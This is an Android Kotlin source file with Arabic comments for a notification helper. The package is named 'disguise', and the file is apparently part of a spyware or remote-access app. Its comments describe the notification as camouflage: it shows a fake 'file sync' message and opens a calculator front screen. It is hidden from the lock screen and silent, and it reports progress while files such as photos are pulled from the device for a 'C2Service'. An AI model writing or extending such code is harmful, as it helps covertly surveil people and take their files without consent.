package com.example.disguise.util

import android.app.Notification
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.app.NotificationCompat
import com.example.disguise.MainActivity
import com.example.disguise.R

/**
 * Notifier — ينشئ إشعار الخدمة الأمامية (Foreground Service Notification).
 *
 * ✅ إصلاح: Notifier هو object (singleton)، لذا لا يمكن أن يحتوي على
 * companion object بداخله (هذا غير مسموح في Kotlin). الثوابت نُقلت
 * مباشرة داخل object.
 *
 * التمويه:
 * - العنوان: "مزامنة الملفات"
 * - النص: "جارٍ مزامنة ملفاتك في الخلفية"
 * - الأيقونة: ic_sync (سهمان دائريان)
 * - الضغط: يفتح MainActivity (واجهة الآلة الحاسبة)
 *
 * ملاحظات Android 13+:
 * - POST_NOTIFICATIONS إذن مطلوب لعرض الإشعار.
 * - إذا لم يُمنح، الإشعار لن يظهر لكن الخدمة تعمل.
 *
 * ملاحظات Android 14+:
 * - يجب التصريح بـ foregroundServiceType في Manifest (dataSync).
 * - الإشعار يظهر إجبارياً (لا يمكن إخفاؤه).
 */
object Notifier {

    // ✅ الثوابت مباشرة (بدون companion object)
    const val NOTIFICATION_ID = 1001
    const val CHANNEL_ID = "sync_channel"

    /**
     * بناء الإشعار المموّه (الافتراضي للخدمة الأمامية).
     *
     * @param context السياق (عادةً C2Service)
     * @param channelId معرف القناة (افتراضي: CHANNEL_ID)
     * @return Notification جاهز للاستخدام مع startForeground()
     */
    fun buildNotification(
        context: Context,
        channelId: String = CHANNEL_ID
    ): Notification {

        // Intent لفتح MainActivity عند الضغط على الإشعار
        val contentIntent = Intent(context, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }

        val pendingFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        } else {
            PendingIntent.FLAG_UPDATE_CURRENT
        }

        val pendingIntent = PendingIntent.getActivity(
            context,
            0,
            contentIntent,
            pendingFlags
        )

        // بناء الإشعار
        val builder = NotificationCompat.Builder(context, channelId)
            .setContentTitle(context.getString(R.string.notif_title))
            .setContentText(context.getString(R.string.notif_text))
            .setSmallIcon(R.drawable.ic_sync)              // أيقونة صغيرة (موجودة في drawable)
            .setContentIntent(pendingIntent)
            .setOngoing(true)                               // لا يمكن إزالته بالسحب
            .setSilent(true)                                // بدون صوت
            .setPriority(NotificationCompat.PRIORITY_LOW)   // أولوية منخفضة
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // لا يظهر على شاشة القفل
            .setShowWhen(false)                             // لا يعرض الوقت

        // Android 12+ (API 31): عرض فوري بدلاً من تأخير 10 ثوانٍ
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            builder.setForegroundServiceBehavior(
                NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE
            )
        }

        return builder.build()
    }

    /**
     * إشعار تحديث التقدم (اختياري).
     * مفيد عند سحب ملف كبير: "جارٍ سحب IMG_1234.jpg (45%)".
     *
     * @param progress النسبة 0-100
     * @param fileName اسم الملف الحالي
     */
    fun buildProgressNotification(
        context: Context,
        progress: Int,
        fileName: String,
        channelId: String = CHANNEL_ID
    ): Notification {
        val contentIntent = Intent(context, MainActivity::class.java)
        val pendingFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        } else {
            PendingIntent.FLAG_UPDATE_CURRENT
        }
        val pendingIntent = PendingIntent.getActivity(context, 0, contentIntent, pendingFlags)

        return NotificationCompat.Builder(context, channelId)
            .setContentTitle(context.getString(R.string.notif_title))
            .setContentText("جارٍ سحب: $fileName ($progress%)")
            .setSmallIcon(R.drawable.ic_sync)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setProgress(100, progress, false)
            .build()
    }

    /**
     * إشعار بسيط (غير Foreground) للرسائل العابرة.
     * مثلاً: "تم سحب الملف بنجاح".
     */
    fun showSimple(context: Context, title: String, text: String) {
        try {
            val manager = context.getSystemService(Context.NOTIFICATION_SERVICE)
                    as NotificationManager
            val notification = NotificationCompat.Builder(context, CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(R.drawable.ic_sync)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setAutoCancel(true)
                .build()
            manager.notify(System.currentTimeMillis().toInt(), notification)
        } catch (e: Exception) {
            android.util.Log.e("Notifier", "showSimple error: ${e.message}", e)
        }
    }
}
